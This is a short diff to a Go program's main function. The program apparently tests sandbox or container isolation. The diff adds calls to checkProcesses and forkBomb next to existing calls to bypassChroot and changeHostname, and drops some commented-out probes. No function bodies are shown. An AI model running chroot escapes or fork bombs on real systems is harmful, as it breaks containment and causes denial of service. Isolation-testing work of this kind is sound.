@@ -19,9 +19,8 @@ func main() {
 	checkRootFiles(continueIfFedCh)
 	bypassChroot(continueIfFedCh)
 	changeHostname(continueIfFedCh)
-	// spyProcesses(continueIfFedCh)
-	// checkOwnPID(continueIfFedCh)
-	// mountDevices(continueIfFedCh)
+	checkProcesses(continueIfFedCh)
+	forkBomb(continueIfFedCh)
 	select {}
 }
 
